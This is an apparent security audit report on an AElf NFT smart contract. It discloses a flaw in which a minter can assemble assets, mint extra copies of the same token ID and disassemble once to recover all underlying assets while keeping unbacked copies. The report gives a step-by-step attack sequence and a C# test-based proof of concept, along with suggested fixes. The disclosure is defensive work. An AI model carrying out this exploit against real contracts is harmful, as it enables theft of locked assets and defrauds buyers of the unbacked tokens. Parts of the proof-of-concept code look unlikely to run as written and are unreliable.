# Audit Report

## Title
Asset Duplication via Disassemble with Multiple NFT Copies

## Summary
The `Disassemble` function contains a critical logic flaw where it hardcodes the burn amount to 1 while unconditionally removing all assembled asset mappings. When combined with the `IsTokenIdReuse` protocol setting, attackers with minting privileges can create multiple copies of an assembled NFT, disassemble once to recover all underlying assets, and retain fraudulent copies with no backing.

## Finding Description

The vulnerability stems from the interaction of three components in the NFT contract that creates an exploitable state inconsistency:

**1. Disassemble burns only 1 token but removes all mappings**

The `Disassemble` function hardcodes the burn amount regardless of how many copies exist: [1](#0-0) 

It then unconditionally removes the entire assembled asset mappings from contract state: [2](#0-1) [3](#0-2) 

**2. Assemble creates with enforced uniqueness**

The `Assemble` function forces token ID uniqueness by passing `isTokenIdMustBeUnique=true`: [4](#0-3) 

**3. Mint can add quantity when IsTokenIdReuse=true**

The public `Mint` function calls `PerformMint` with the default parameter `isTokenIdMustBeUnique=false`: [5](#0-4) 

The uniqueness check logic in `PerformMint`: [6](#0-5) 

When `IsTokenIdReuse=true` (a legitimate protocol configuration), the condition evaluates to `if (!true || false)` = `if (false)`, skipping the assertion and allowing the else branch to add quantity: [7](#0-6) 

**4. State mappings are per-token, not per-quantity**

The assembled asset mappings are keyed by token hash only: [8](#0-7) 

This means all copies of an assembled NFT with the same tokenId reference the same single set of underlying assets.

**Attack Sequence:**
1. Attacker (a minter) assembles valuable NFTs/FTs into an assembled NFT (quantity=1)
2. Attacker calls `Mint` with the same tokenId, adding quantity (quantity becomes 2+)
3. Attacker calls `Disassemble` once, burning 1 but recovering ALL underlying assets
4. Attacker retains remaining copies which appear legitimate but have no backing

## Impact Explanation

This vulnerability enables **HIGH severity** direct asset theft:

- **Asset Theft**: Attackers extract all underlying NFTs/FTs locked in assembled tokens while retaining unbacked copies
- **Fraudulent NFTs**: Unbacked assembled NFTs circulate, appearing legitimate but having no redeemable value
- **Buyer Fraud**: Innocent purchasers of these fraudulent tokens lose their investment when they attempt to disassemble and discover no underlying assets exist
- **Protocol Damage**: Complete loss of trust in the assembly system, potential systemic failure if widely exploited
- **Arbitrary Value**: The attack works regardless of the value of underlying assets, enabling theft of any valuable NFT/FT combinations

The impact is concrete and measurable - direct theft of protocol-owned assets with immediate financial consequences.

## Likelihood Explanation

The attack requires two preconditions that make it **MEDIUM likelihood**:

**Precondition 1: Protocol has IsTokenIdReuse=true**

This is a legitimate protocol configuration option defined in the Create function: [9](#0-8) 

Protocols may enable this for valid operational reasons (e.g., allowing token ID reuse after burns in game mechanics).

**Precondition 2: Attacker has minter privileges**

Required by the Burn function's permission check: [10](#0-9) 

Minter privileges are granted by protocol creators and may be distributed to partners, game operators, or other semi-trusted parties. This is NOT a fully trusted role - minters should be able to mint/burn tokens but should NOT be able to break protocol invariants and steal locked assets.

**Attack Complexity: LOW**
- Simple 3-step sequence: Assemble → Mint → Disassemble
- No timing dependencies or race conditions
- No complex state manipulation required
- Difficult to detect until assets are withdrawn
- Easily reproducible once preconditions are met

## Recommendation

Implement one of the following fixes:

**Option 1: Track assembled assets per-instance (Recommended)**
Modify the state structure to track assembled assets per token instance rather than per tokenHash. This requires changing the mapping to include quantity tracking.

**Option 2: Prevent minting of assembled tokens**
Add a check in `PerformMint` to prevent adding quantity to tokens that have assembled assets:
```csharp
if (nftInfo != null && (State.AssembledNftsMap[tokenHash] != null || State.AssembledFtsMap[tokenHash] != null))
{
    Assert(false, "Cannot mint additional copies of assembled tokens.");
}
```

**Option 3: Burn all copies in Disassemble**
Modify `Disassemble` to burn all existing copies of the token before releasing assets:
```csharp
var nftInfo = GetNFTInfoByTokenHash(tokenHash);
Burn(new BurnInput
{
    Symbol = input.Symbol,
    TokenId = input.TokenId,
    Amount = nftInfo.Quantity  // Burn all copies
});
```

## Proof of Concept

```csharp
[Fact]
public async Task AssetDuplicationVulnerability()
{
    // Setup: Create protocol with IsTokenIdReuse=true and IsBurnable=true
    var symbol = await CreateProtocolWithTokenIdReuse();
    await AddMinterAsync(symbol);
    
    // Step 1: Mint an NFT to assemble
    var nftHash = await MintSingleNFT(symbol);
    
    // Step 2: Approve tokens for assembly
    await ApproveTokensForAssembly();
    
    // Step 3: Attacker assembles NFT with valuable assets
    var assembledHash = await NFTContractStub.Assemble.SendAsync(new AssembleInput
    {
        Symbol = symbol,
        TokenId = 1,
        AssembledNfts = new AssembledNfts { Value = { [nftHash.ToHex()] = 1 } },
        AssembledFts = new AssembledFts { Value = { ["ELF"] = 1000_00000000 } }
    });
    
    // Verify: 1 assembled token exists with backing
    var balance1 = await GetBalance(symbol, 1);
    balance1.ShouldBe(1);
    
    // Step 4: Attacker mints another copy of the same tokenId
    await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        TokenId = 1,
        Owner = MinterAddress
    });
    
    // Verify: Now 2 copies exist
    var balance2 = await GetBalance(symbol, 1);
    balance2.ShouldBe(2);
    
    // Step 5: Attacker disassembles once to recover ALL assets
    await MinterNFTContractStub.Disassemble.SendAsync(new DisassembleInput
    {
        Symbol = symbol,
        TokenId = 1
    });
    
    // Verify: Attacker still has 1 copy but recovered all assets
    var finalBalance = await GetBalance(symbol, 1);
    finalBalance.ShouldBe(1); // Still has 1 fraudulent copy
    
    // Verify: Original NFT and ELF returned to attacker
    var nftReturned = await NFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = MinterAddress,
        Symbol = symbol,
        TokenId = nftHash
    });
    nftReturned.Balance.ShouldBe(1);
    
    // Verify: Assembled mappings removed despite remaining copy
    var assembledNfts = State.AssembledNftsMap[assembledHash];
    assembledNfts.ShouldBeNull(); // Mapping removed!
    
    // Impact: Remaining copy has no backing and appears legitimate
}
```

## Notes

This vulnerability demonstrates a critical design flaw where per-tokenHash storage of assembled assets conflicts with the ability to create multiple instances when `IsTokenIdReuse=true`. The minter role should be considered semi-trusted - minters need the ability to create tokens but should not be able to violate fundamental protocol invariants like "assembled NFTs are backed by their underlying assets." The fix should either prevent minting duplicate assembled tokens or ensure that disassembly only occurs when all copies are burned.

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L17-17)
```csharp
        var nftMinted = PerformMint(input);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L89-93)
```csharp
        var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L175-175)
```csharp
        var nftMinted = PerformMint(mingInput, true);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L193-198)
```csharp
        Burn(new BurnInput
        {
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            Amount = 1
        });
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L209-209)
```csharp
            State.AssembledNftsMap.Remove(tokenHash);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L224-224)
```csharp
            State.AssembledFtsMap.Remove(tokenHash);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L395-396)
```csharp
        if (!protocolInfo.IsTokenIdReuse || isTokenIdMustBeUnique)
            Assert(nftInfo == null, $"Token id {tokenId} already exists. Please assign a different token id.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L433-437)
```csharp
        else
        {
            nftInfo.Quantity = nftInfo.Quantity.Add(quantity);
            if (!nftInfo.Minters.Contains(Context.Sender)) nftInfo.Minters.Add(Context.Sender);
        }
```

**File:** contract/AElf.Contracts.NFT/NFTContractState.cs (L32-33)
```csharp
    public MappedState<Hash, AssembledNfts> AssembledNftsMap { get; set; }
    public MappedState<Hash, AssembledFts> AssembledFtsMap { get; set; }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L48-48)
```csharp
            IsTokenIdReuse = input.IsTokenIdReuse,
```
